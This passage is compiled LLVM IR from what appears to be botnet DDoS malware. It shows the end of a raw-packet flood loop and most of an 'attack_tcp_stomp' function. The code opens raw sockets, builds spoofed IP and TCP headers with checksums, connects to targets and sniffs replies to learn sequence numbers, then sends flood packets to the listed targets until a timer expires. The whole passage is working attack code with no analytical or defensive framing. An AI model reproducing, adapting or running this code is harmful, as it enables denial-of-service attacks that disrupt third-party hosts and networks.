; <label>:386:                                    ; preds = %382, %379
  %387 = load i32, i32* %21, align 4
  %388 = icmp eq i32 %387, 65535
  br i1 %388, label %389, label %393

; <label>:389:                                    ; preds = %386
  %390 = call i32 @rand_next()
  %391 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %392 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %391, i32 0, i32 3
  store i32 %390, i32* %392, align 4
  br label %393

; <label>:393:                                    ; preds = %389, %386
  %394 = load i8, i8* %29, align 1
  %395 = icmp ne i8 %394, 0
  br i1 %395, label %396, label %403

; <label>:396:                                    ; preds = %393
  %397 = load i8*, i8** %38, align 8
  %398 = load i32, i32* %28, align 4
  call void @rand_alphastr(i8* %397, i32 %398)
  %399 = load i8*, i8** %38, align 8
  %400 = load i32, i32* %28, align 4
  %401 = sext i32 %400 to i64
  %402 = getelementptr inbounds i8, i8* %399, i64 %401
  store i8 0, i8* %402, align 1
  br label %403

; <label>:403:                                    ; preds = %396, %393
  %404 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %405 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %404, i32 0, i32 7
  store i16 0, i16* %405, align 2
  %406 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %407 = bitcast %struct.iphdr* %406 to i16*
  %408 = call zeroext i16 @checksum_generic(i16* %407, i32 20)
  %409 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %410 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %409, i32 0, i32 7
  store i16 %408, i16* %410, align 2
  %411 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %412 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %411, i32 0, i32 6
  store i16 0, i16* %412, align 4
  %413 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %414 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %415 = bitcast %struct.tcphdr* %414 to i8*
  %416 = load i32, i32* %28, align 4
  %417 = sext i32 %416 to i64
  %418 = add i64 20, %417
  %419 = trunc i64 %418 to i16
  %420 = call zeroext i16 @htons(i16 zeroext %419) #7
  %421 = load i32, i32* %28, align 4
  %422 = sext i32 %421 to i64
  %423 = add i64 20, %422
  %424 = trunc i64 %423 to i32
  %425 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %413, i8* %415, i16 zeroext %420, i32 %424)
  %426 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %427 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %426, i32 0, i32 6
  store i16 %425, i16* %427, align 4
  %428 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %429 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %428, i32 0, i32 1
  %430 = load i16, i16* %429, align 2
  %431 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %432 = load i32, i32* %11, align 4
  %433 = sext i32 %432 to i64
  %434 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %431, i64 %433
  %435 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %434, i32 0, i32 0
  %436 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %435, i32 0, i32 1
  store i16 %430, i16* %436, align 2
  %437 = load i32, i32* %12, align 4
  %438 = load i8*, i8** %35, align 8
  %439 = load i32, i32* %28, align 4
  %440 = sext i32 %439 to i64
  %441 = add i64 40, %440
  %442 = bitcast %union.__CONST_SOCKADDR_ARG* %39 to %struct.sockaddr**
  %443 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %444 = load i32, i32* %11, align 4
  %445 = sext i32 %444 to i64
  %446 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %443, i64 %445
  %447 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %446, i32 0, i32 0
  %448 = bitcast %struct.sockaddr_in* %447 to %struct.sockaddr*
  store %struct.sockaddr* %448, %struct.sockaddr** %442, align 8
  %449 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %39, i32 0, i32 0
  %450 = load %struct.sockaddr*, %struct.sockaddr** %449, align 8
  %451 = call i64 @sendto(i32 %437, i8* %438, i64 %441, i32 16384, %struct.sockaddr* %450, i32 16)
  br label %452

; <label>:452:                                    ; preds = %403
  %453 = load i32, i32* %11, align 4
  %454 = add nsw i32 %453, 1
  store i32 %454, i32* %11, align 4
  br label %294

; <label>:455:                                    ; preds = %294
  %456 = call i64 @time(i64* null) #6
  %457 = load i32, i32* %31, align 4
  %458 = sext i32 %457 to i64
  %459 = icmp sgt i64 %456, %458
  br i1 %459, label %460, label %461

; <label>:460:                                    ; preds = %455
  br label %462

; <label>:461:                                    ; preds = %455
  br label %293

; <label>:462:                                    ; preds = %460, %122, %116
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_tcp_stomp(i32, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %6 = alloca i32, align 4
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_target*, align 8
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_option*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca %struct.attack_stomp_data*, align 8
  %14 = alloca i8**, align 8
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i8, align 1
  %18 = alloca i8, align 1
  %19 = alloca i16, align 2
  %20 = alloca i8, align 1
  %21 = alloca i8, align 1
  %22 = alloca i8, align 1
  %23 = alloca i8, align 1
  %24 = alloca i8, align 1
  %25 = alloca i8, align 1
  %26 = alloca i32, align 4
  %27 = alloca i8, align 1
  %28 = alloca i32, align 4
  %29 = alloca i32, align 4
  %30 = alloca %struct.sockaddr_in, align 4
  %31 = alloca %struct.sockaddr_in, align 4
  %32 = alloca i32, align 4
  %33 = alloca [256 x i8], align 16
  %34 = alloca i64, align 8
  %35 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %36 = alloca i32, align 4
  %37 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %38 = alloca %struct.tcphdr*, align 8
  %39 = alloca %struct.iphdr*, align 8
  %40 = alloca %struct.tcphdr*, align 8
  %41 = alloca i8*, align 8
  %42 = alloca i8*, align 8
  %43 = alloca %struct.iphdr*, align 8
  %44 = alloca %struct.tcphdr*, align 8
  %45 = alloca i8*, align 8
  %46 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i32 %0, i32* %6, align 4
  store i8 %1, i8* %7, align 1
  store %struct.attack_target* %2, %struct.attack_target** %8, align 8
  store i8 %3, i8* %9, align 1
  store %struct.attack_option* %4, %struct.attack_option** %10, align 8
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %47 = load i8, i8* %7, align 1
  %48 = zext i8 %47 to i64
  %49 = call noalias i8* @calloc(i64 %48, i64 16) #6
  %50 = bitcast i8* %49 to %struct.attack_stomp_data*
  store %struct.attack_stomp_data* %50, %struct.attack_stomp_data** %13, align 8
  %51 = load i8, i8* %7, align 1
  %52 = zext i8 %51 to i64
  %53 = call noalias i8* @calloc(i64 %52, i64 8) #6
  %54 = bitcast i8* %53 to i8**
  store i8** %54, i8*** %14, align 8
  %55 = load i8, i8* %9, align 1
  %56 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %57 = call i32 @attack_get_opt_int(i8 zeroext %55, %struct.attack_option* %56, i8 zeroext 2, i32 0)
  %58 = trunc i32 %57 to i8
  store i8 %58, i8* %15, align 1
  %59 = load i8, i8* %9, align 1
  %60 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %61 = call i32 @attack_get_opt_int(i8 zeroext %59, %struct.attack_option* %60, i8 zeroext 3, i32 65535)
  %62 = trunc i32 %61 to i16
  store i16 %62, i16* %16, align 2
  %63 = load i8, i8* %9, align 1
  %64 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %65 = call i32 @attack_get_opt_int(i8 zeroext %63, %struct.attack_option* %64, i8 zeroext 4, i32 64)
  %66 = trunc i32 %65 to i8
  store i8 %66, i8* %17, align 1
  %67 = load i8, i8* %9, align 1
  %68 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %69 = call i32 @attack_get_opt_int(i8 zeroext %67, %struct.attack_option* %68, i8 zeroext 5, i32 1)
  %70 = trunc i32 %69 to i8
  store i8 %70, i8* %18, align 1
  %71 = load i8, i8* %9, align 1
  %72 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %73 = call i32 @attack_get_opt_int(i8 zeroext %71, %struct.attack_option* %72, i8 zeroext 7, i32 65535)
  %74 = trunc i32 %73 to i16
  store i16 %74, i16* %19, align 2
  %75 = load i8, i8* %9, align 1
  %76 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %77 = call i32 @attack_get_opt_int(i8 zeroext %75, %struct.attack_option* %76, i8 zeroext 10, i32 0)
  %78 = trunc i32 %77 to i8
  store i8 %78, i8* %20, align 1
  %79 = load i8, i8* %9, align 1
  %80 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %81 = call i32 @attack_get_opt_int(i8 zeroext %79, %struct.attack_option* %80, i8 zeroext 11, i32 1)
  %82 = trunc i32 %81 to i8
  store i8 %82, i8* %21, align 1
  %83 = load i8, i8* %9, align 1
  %84 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %85 = call i32 @attack_get_opt_int(i8 zeroext %83, %struct.attack_option* %84, i8 zeroext 12, i32 1)
  %86 = trunc i32 %85 to i8
  store i8 %86, i8* %22, align 1
  %87 = load i8, i8* %9, align 1
  %88 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %89 = call i32 @attack_get_opt_int(i8 zeroext %87, %struct.attack_option* %88, i8 zeroext 13, i32 0)
  %90 = trunc i32 %89 to i8
  store i8 %90, i8* %23, align 1
  %91 = load i8, i8* %9, align 1
  %92 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %93 = call i32 @attack_get_opt_int(i8 zeroext %91, %struct.attack_option* %92, i8 zeroext 14, i32 0)
  %94 = trunc i32 %93 to i8
  store i8 %94, i8* %24, align 1
  %95 = load i8, i8* %9, align 1
  %96 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %97 = call i32 @attack_get_opt_int(i8 zeroext %95, %struct.attack_option* %96, i8 zeroext 15, i32 0)
  %98 = trunc i32 %97 to i8
  store i8 %98, i8* %25, align 1
  %99 = load i8, i8* %9, align 1
  %100 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %101 = call i32 @attack_get_opt_int(i8 zeroext %99, %struct.attack_option* %100, i8 zeroext 0, i32 768)
  store i32 %101, i32* %26, align 4
  %102 = load i8, i8* %9, align 1
  %103 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %104 = call i32 @attack_get_opt_int(i8 zeroext %102, %struct.attack_option* %103, i8 zeroext 1, i32 1)
  %105 = trunc i32 %104 to i8
  store i8 %105, i8* %27, align 1
  %106 = call i64 @time(i64* null) #6
  %107 = load i32, i32* %6, align 4
  %108 = sext i32 %107 to i64
  %109 = add nsw i64 %106, %108
  %110 = trunc i64 %109 to i32
  store i32 %110, i32* %28, align 4
  %111 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %111, i32* %12, align 4
  %112 = icmp eq i32 %111, -1
  br i1 %112, label %113, label %114

; <label>:113:                                    ; preds = %5
  br label %629

; <label>:114:                                    ; preds = %5
  store i32 1, i32* %11, align 4
  %115 = load i32, i32* %12, align 4
  %116 = bitcast i32* %11 to i8*
  %117 = call i32 @setsockopt(i32 %115, i32 0, i32 3, i8* %116, i32 4) #6
  %118 = icmp eq i32 %117, -1
  br i1 %118, label %119, label %122

; <label>:119:                                    ; preds = %114
  %120 = load i32, i32* %12, align 4
  %121 = call i32 @close(i32 %120)
  br label %629

; <label>:122:                                    ; preds = %114
  store i32 0, i32* %11, align 4
  br label %123

; <label>:123:                                    ; preds = %504, %122
  %124 = load i32, i32* %11, align 4
  %125 = load i8, i8* %7, align 1
  %126 = zext i8 %125 to i32
  %127 = icmp slt i32 %124, %126
  br i1 %127, label %128, label %507

; <label>:128:                                    ; preds = %123
  store i32 0, i32* %29, align 4
  br label %129

; <label>:129:                                    ; preds = %499, %488, %128
  %130 = call i32 @socket(i32 2, i32 1, i32 0) #6
  store i32 %130, i32* %29, align 4
  %131 = icmp eq i32 %130, -1
  br i1 %131, label %132, label %133

; <label>:132:                                    ; preds = %129
  br label %504

; <label>:133:                                    ; preds = %129
  %134 = load i32, i32* %29, align 4
  %135 = load i32, i32* %29, align 4
  %136 = call i32 (i32, i32, ...) @fcntl(i32 %135, i32 3, i32 0)
  %137 = or i32 %136, 2048
  %138 = call i32 (i32, i32, ...) @fcntl(i32 %134, i32 4, i32 %137)
  %139 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %30, i32 0, i32 0
  store i16 2, i16* %139, align 4
  %140 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %141 = load i32, i32* %11, align 4
  %142 = sext i32 %141 to i64
  %143 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %140, i64 %142
  %144 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %143, i32 0, i32 2
  %145 = load i8, i8* %144, align 4
  %146 = zext i8 %145 to i32
  %147 = icmp slt i32 %146, 32
  br i1 %147, label %148, label %169

; <label>:148:                                    ; preds = %133
  %149 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %150 = load i32, i32* %11, align 4
  %151 = sext i32 %150 to i64
  %152 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %149, i64 %151
  %153 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %152, i32 0, i32 1
  %154 = load i32, i32* %153, align 4
  %155 = call i32 @ntohl(i32 %154) #7
  %156 = call i32 @rand_next()
  %157 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %158 = load i32, i32* %11, align 4
  %159 = sext i32 %158 to i64
  %160 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %157, i64 %159
  %161 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %160, i32 0, i32 2
  %162 = load i8, i8* %161, align 4
  %163 = zext i8 %162 to i32
  %164 = lshr i32 %156, %163
  %165 = add i32 %155, %164
  %166 = call i32 @htonl(i32 %165) #7
  %167 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %30, i32 0, i32 2
  %168 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %167, i32 0, i32 0
  store i32 %166, i32* %168, align 4
  br label %178

; <label>:169:                                    ; preds = %133
  %170 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %171 = load i32, i32* %11, align 4
  %172 = sext i32 %171 to i64
  %173 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %170, i64 %172
  %174 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %173, i32 0, i32 1
  %175 = load i32, i32* %174, align 4
  %176 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %30, i32 0, i32 2
  %177 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %176, i32 0, i32 0
  store i32 %175, i32* %177, align 4
  br label %178

; <label>:178:                                    ; preds = %169, %148
  %179 = load i16, i16* %19, align 2
  %180 = zext i16 %179 to i32
  %181 = icmp eq i32 %180, 65535
  br i1 %181, label %182, label %187

; <label>:182:                                    ; preds = %178
  %183 = call i32 @rand_next()
  %184 = and i32 %183, 65535
  %185 = trunc i32 %184 to i16
  %186 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %30, i32 0, i32 1
  store i16 %185, i16* %186, align 2
  br label %191

; <label>:187:                                    ; preds = %178
  %188 = load i16, i16* %19, align 2
  %189 = call zeroext i16 @htons(i16 zeroext %188) #7
  %190 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %30, i32 0, i32 1
  store i16 %189, i16* %190, align 2
  br label %191

; <label>:191:                                    ; preds = %187, %182
  %192 = load i32, i32* %29, align 4
  %193 = bitcast %union.__CONST_SOCKADDR_ARG* %35 to %struct.sockaddr**
  %194 = bitcast %struct.sockaddr_in* %30 to %struct.sockaddr*
  store %struct.sockaddr* %194, %struct.sockaddr** %193, align 8
  %195 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %35, i32 0, i32 0
  %196 = load %struct.sockaddr*, %struct.sockaddr** %195, align 8
  %197 = call i32 @connect(i32 %192, %struct.sockaddr* %196, i32 16)
  %198 = call i64 @time(i64* null) #6
  store i64 %198, i64* %34, align 8
  br label %199

; <label>:199:                                    ; preds = %502, %191
  store i32 0, i32* %36, align 4
  store i32 16, i32* %32, align 4
  %200 = load i32, i32* %12, align 4
  %201 = getelementptr inbounds [256 x i8], [256 x i8]* %33, i32 0, i32 0
  %202 = bitcast %union.__CONST_SOCKADDR_ARG* %37 to %struct.sockaddr**
  %203 = bitcast %struct.sockaddr_in* %31 to %struct.sockaddr*
  store %struct.sockaddr* %203, %struct.sockaddr** %202, align 8
  %204 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %37, i32 0, i32 0
  %205 = load %struct.sockaddr*, %struct.sockaddr** %204, align 8
  %206 = call i64 @recvfrom(i32 %200, i8* %201, i64 256, i32 16384, %struct.sockaddr* %205, i32* %32)
  %207 = trunc i64 %206 to i32
  store i32 %207, i32* %36, align 4
  %208 = load i32, i32* %36, align 4
  %209 = icmp eq i32 %208, -1
  br i1 %209, label %210, label %211

; <label>:210:                                    ; preds = %199
  br label %629

; <label>:211:                                    ; preds = %199
  %212 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %31, i32 0, i32 2
  %213 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %212, i32 0, i32 0
  %214 = load i32, i32* %213, align 4
  %215 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %30, i32 0, i32 2
  %216 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %215, i32 0, i32 0
  %217 = load i32, i32* %216, align 4
  %218 = icmp eq i32 %214, %217
  br i1 %218, label %219, label %494

; <label>:219:                                    ; preds = %211
  %220 = load i32, i32* %36, align 4
  %221 = sext i32 %220 to i64
  %222 = icmp ugt i64 %221, 40
  br i1 %222, label %223, label %494

; <label>:223:                                    ; preds = %219
  %224 = getelementptr inbounds [256 x i8], [256 x i8]* %33, i32 0, i32 0
  %225 = getelementptr inbounds i8, i8* %224, i64 20
  %226 = bitcast i8* %225 to %struct.tcphdr*
  store %struct.tcphdr* %226, %struct.tcphdr** %38, align 8
  %227 = load %struct.tcphdr*, %struct.tcphdr** %38, align 8
  %228 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %227, i32 0, i32 0
  %229 = load i16, i16* %228, align 4
  %230 = zext i16 %229 to i32
  %231 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %30, i32 0, i32 1
  %232 = load i16, i16* %231, align 2
  %233 = zext i16 %232 to i32
  %234 = icmp eq i32 %230, %233
  br i1 %234, label %235, label %493

; <label>:235:                                    ; preds = %223
  %236 = load %struct.tcphdr*, %struct.tcphdr** %38, align 8
  %237 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %236, i32 0, i32 4
  %238 = load i16, i16* %237, align 4
  %239 = lshr i16 %238, 9
  %240 = and i16 %239, 1
  %241 = zext i16 %240 to i32
  %242 = icmp ne i32 %241, 0
  br i1 %242, label %243, label %472

; <label>:243:                                    ; preds = %235
  %244 = load %struct.tcphdr*, %struct.tcphdr** %38, align 8
  %245 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %244, i32 0, i32 4
  %246 = load i16, i16* %245, align 4
  %247 = lshr i16 %246, 12
  %248 = and i16 %247, 1
  %249 = zext i16 %248 to i32
  %250 = icmp ne i32 %249, 0
  br i1 %250, label %251, label %472

; <label>:251:                                    ; preds = %243
  %252 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %30, i32 0, i32 2
  %253 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %252, i32 0, i32 0
  %254 = load i32, i32* %253, align 4
  %255 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %13, align 8
  %256 = load i32, i32* %11, align 4
  %257 = sext i32 %256 to i64
  %258 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %255, i64 %257
  %259 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %258, i32 0, i32 0
  store i32 %254, i32* %259, align 4
  %260 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %261 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %260, i32 0, i32 2
  %262 = load i32, i32* %261, align 4
  %263 = call i32 @ntohl(i32 %262) #7
  %264 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %13, align 8
  %265 = load i32, i32* %11, align 4
  %266 = sext i32 %265 to i64
  %267 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %264, i64 %266
  %268 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %267, i32 0, i32 1
  store i32 %263, i32* %268, align 4
  %269 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %270 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %269, i32 0, i32 3
  %271 = load i32, i32* %270, align 4
  %272 = call i32 @ntohl(i32 %271) #7
  %273 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %13, align 8
  %274 = load i32, i32* %11, align 4
  %275 = sext i32 %274 to i64
  %276 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %273, i64 %275
  %277 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %276, i32 0, i32 2
  store i32 %272, i32* %277, align 4
  %278 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %279 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %278, i32 0, i32 1
  %280 = load i16, i16* %279, align 2
  %281 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %13, align 8
  %282 = load i32, i32* %11, align 4
  %283 = sext i32 %282 to i64
  %284 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %281, i64 %283
  %285 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %284, i32 0, i32 3
  store i16 %280, i16* %285, align 4
  %286 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %30, i32 0, i32 1
  %287 = load i16, i16* %286, align 2
  %288 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %13, align 8
  %289 = load i32, i32* %11, align 4
  %290 = sext i32 %289 to i64
  %291 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %288, i64 %290
  %292 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %291, i32 0, i32 4
  store i16 %287, i16* %292, align 2
  %293 = load i32, i32* %26, align 4
  %294 = sext i32 %293 to i64
  %295 = add i64 40, %294
  %296 = call noalias i8* @malloc(i64 %295) #6
  %297 = load i8**, i8*** %14, align 8
  %298 = load i32, i32* %11, align 4
  %299 = sext i32 %298 to i64
  %300 = getelementptr inbounds i8*, i8** %297, i64 %299
  store i8* %296, i8** %300, align 8
  %301 = load i8**, i8*** %14, align 8
  %302 = load i32, i32* %11, align 4
  %303 = sext i32 %302 to i64
  %304 = getelementptr inbounds i8*, i8** %301, i64 %303
  %305 = load i8*, i8** %304, align 8
  %306 = bitcast i8* %305 to %struct.iphdr*
  store %struct.iphdr* %306, %struct.iphdr** %39, align 8
  %307 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %308 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %307, i64 1
  %309 = bitcast %struct.iphdr* %308 to %struct.tcphdr*
  store %struct.tcphdr* %309, %struct.tcphdr** %40, align 8
  %310 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %311 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %310, i64 1
  %312 = bitcast %struct.tcphdr* %311 to i8*
  store i8* %312, i8** %41, align 8
  %313 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %314 = bitcast %struct.iphdr* %313 to i8*
  %315 = load i8, i8* %314, align 4
  %316 = and i8 %315, 15
  %317 = or i8 %316, 64
  store i8 %317, i8* %314, align 4
  %318 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %319 = bitcast %struct.iphdr* %318 to i8*
  %320 = load i8, i8* %319, align 4
  %321 = and i8 %320, -16
  %322 = or i8 %321, 5
  store i8 %322, i8* %319, align 4
  %323 = load i8, i8* %15, align 1
  %324 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %325 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %324, i32 0, i32 1
  store i8 %323, i8* %325, align 1
  %326 = load i32, i32* %26, align 4
  %327 = sext i32 %326 to i64
  %328 = add i64 40, %327
  %329 = trunc i64 %328 to i16
  %330 = call zeroext i16 @htons(i16 zeroext %329) #7
  %331 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %332 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %331, i32 0, i32 2
  store i16 %330, i16* %332, align 2
  %333 = load i16, i16* %16, align 2
  %334 = call zeroext i16 @htons(i16 zeroext %333) #7
  %335 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %336 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %335, i32 0, i32 3
  store i16 %334, i16* %336, align 4
  %337 = load i8, i8* %17, align 1
  %338 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %339 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %338, i32 0, i32 5
  store i8 %337, i8* %339, align 4
  %340 = load i8, i8* %18, align 1
  %341 = icmp ne i8 %340, 0
  br i1 %341, label %342, label %346

; <label>:342:                                    ; preds = %251
  %343 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %344 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %345 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %344, i32 0, i32 4
  store i16 %343, i16* %345, align 2
  br label %346

; <label>:346:                                    ; preds = %342, %251
  %347 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %348 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %347, i32 0, i32 6
  store i8 6, i8* %348, align 1
  %349 = load i32, i32* @LOCAL_ADDR, align 4
  %350 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %351 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %350, i32 0, i32 8
  store i32 %349, i32* %351, align 4
  %352 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %13, align 8
  %353 = load i32, i32* %11, align 4
  %354 = sext i32 %353 to i64
  %355 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %352, i64 %354
  %356 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %355, i32 0, i32 0
  %357 = load i32, i32* %356, align 4
  %358 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %359 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %358, i32 0, i32 9
  store i32 %357, i32* %359, align 4
  %360 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %13, align 8
  %361 = load i32, i32* %11, align 4
  %362 = sext i32 %361 to i64
  %363 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %360, i64 %362
  %364 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %363, i32 0, i32 3
  %365 = load i16, i16* %364, align 4
  %366 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %367 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %366, i32 0, i32 0
  store i16 %365, i16* %367, align 4
  %368 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %13, align 8
  %369 = load i32, i32* %11, align 4
  %370 = sext i32 %369 to i64
  %371 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %368, i64 %370
  %372 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %371, i32 0, i32 4
  %373 = load i16, i16* %372, align 2
  %374 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %375 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %374, i32 0, i32 1
  store i16 %373, i16* %375, align 2
  %376 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %13, align 8
  %377 = load i32, i32* %11, align 4
  %378 = sext i32 %377 to i64
  %379 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %376, i64 %378
  %380 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %379, i32 0, i32 2
  %381 = load i32, i32* %380, align 4
  %382 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %383 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %382, i32 0, i32 2
  store i32 %381, i32* %383, align 4
  %384 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %13, align 8
  %385 = load i32, i32* %11, align 4
  %386 = sext i32 %385 to i64
  %387 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %384, i64 %386
  %388 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %387, i32 0, i32 1
  %389 = load i32, i32* %388, align 4
  %390 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %391 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %390, i32 0, i32 3
  store i32 %389, i32* %391, align 4
  %392 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %393 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %392, i32 0, i32 4
  %394 = load i16, i16* %393, align 4
  %395 = and i16 %394, -241
  %396 = or i16 %395, 128
